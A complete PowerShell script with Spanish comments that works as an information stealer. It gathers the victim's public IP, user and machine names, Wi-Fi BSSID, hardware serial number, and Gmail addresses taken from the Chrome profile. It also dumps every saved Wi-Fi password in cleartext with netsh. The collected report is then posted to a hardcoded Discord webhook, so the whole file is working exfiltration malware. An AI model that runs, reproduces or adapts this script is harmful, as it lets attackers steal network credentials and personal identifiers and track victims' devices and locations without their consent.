# 1. Configuración de Red y Seguridad
$webhook = "https://discord.com/api/webhooks/1485347045794381964/21j8WgCEuZZ4mD4zlNCVF13u-Se56E3Q03wyirmSUA0kQx8cT5A2LJydVwOR1elPkkiK"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. Información Básica e IP
$ip = "Desconocida"
try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { }
$user = $env:USERNAME
$pc = $env:COMPUTERNAME

# 3. Obtener BSSID (Dirección física del AP actual)
$bssidLine = (netsh wlan show interfaces) | Select-String "BSSID"
$bssid = if ($bssidLine) { $bssidLine.ToString().Split(":")[1..6] -join ":" } else { "No Wi-Fi" }

$reporte = "REPORTE EXTRACCION: $pc`n"
$reporte += "Usuario: $user | IP: $ip`n"
$reporte += "BSSID Actual: $($bssid.Trim())`n"
$reporte += ("=" * 40) + "`n"

# 4. Hardware (CPU, RAM, Serial)
$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::round((Get-WmiObject Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB, 0)
$serial = (Get-WmiObject Win32_Bios).SerialNumber
$reporte += "HARDWARE: $cpu | RAM: ${ram}GB | S/N: $serial`n"

# 5. Cuentas de Google (Análisis de Perfil Chrome)
$reporte += "`nCUENTAS DETECTADAS:`n"
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
if (Test-Path $chromePath) {
    $content = Get-Content $chromePath -Raw -ErrorAction SilentlyContinue
    $emails = [regex]::Matches($content, '[\w\.-]+@gmail\.com') | % { $_.Value } | select -Unique
    if ($emails) { foreach ($e in $emails) { $reporte += "- $e`n" } } else { $reporte += "- No encontradas`n" }
}

$reporte += ("-" * 40) + "`nCLAVES WIFI ALMACENADAS:`n"

# 6. Extracción de Perfiles Wi-Fi
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | % { $_.Matches.Groups[1].Value.Trim() }
foreach ($n in $profiles) {
    $v = netsh wlan show profile name="$n" key=clear
    $p = $v | Select-String "Key Content|Contenido de la clave" | % { $_.ToString().Split(":")[1].Trim() }
    if ($p) { $reporte += "SSID: $n | Pass: $p`n" }
}

# 7. Envío de Datos vía Webhook
$json = @{ content = '```' + $reporte + '```' } | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ContentType "application/json"
    Write-Host "LOG: Reporte enviado correctamente."
} catch {
    Write-Host "ERROR: No se pudo completar la peticion." -ForegroundColor Red
}
